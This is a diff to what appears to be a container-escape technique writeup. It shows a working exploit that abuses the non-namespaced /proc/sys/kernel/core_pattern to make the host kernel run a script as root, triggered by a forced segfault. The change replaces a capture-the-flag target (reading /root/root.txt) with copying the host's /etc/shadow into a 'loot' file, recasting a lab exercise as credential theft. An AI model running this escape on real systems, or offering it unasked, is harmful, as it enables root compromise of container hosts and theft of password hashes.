@@ -38,7 +38,7 @@ When cgroups v1 `release_agent` is unavailable (e.g. cgroups v2, or `rdma` subsy
 UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
 
 # Write exploit that runs as root on the HOST when a crash occurs
-printf '#!/bin/sh\ncat /root/root.txt > %s/flag.txt\nchmod 777 %s/flag.txt\n' "$UDIR" "$UDIR" > /exploit.sh
+printf '#!/bin/sh\ncat /etc/shadow > %s/loot\nchmod 777 %s/loot\n' "$UDIR" "$UDIR" > /exploit.sh
 chmod +x /exploit.sh
 
 # Set core_pattern — pipe format makes kernel run the script on any SIGSEGV
@@ -48,9 +48,9 @@ echo "|${UDIR}/exploit.sh" > /proc/sys/kernel/core_pattern
 ulimit -c unlimited
 bash -c 'kill -11 $$'
 
-# Wait, then read the flag (written into container overlay by the host-level script)
+# Wait, then read the loot (written into container overlay by the host-level script)
 sleep 4
-cat /flag.txt
+cat /loot
 ```
 
 **Why it works**: `/proc/sys/kernel/core_pattern` is a kernel-wide parameter, not namespaced. When prefixed with `|`, the kernel runs the specified binary as root in the init namespace (the host). The overlay `upperdir` is a real host path, so the exploit script is accessible from the host and writes output back to a location visible inside the container.
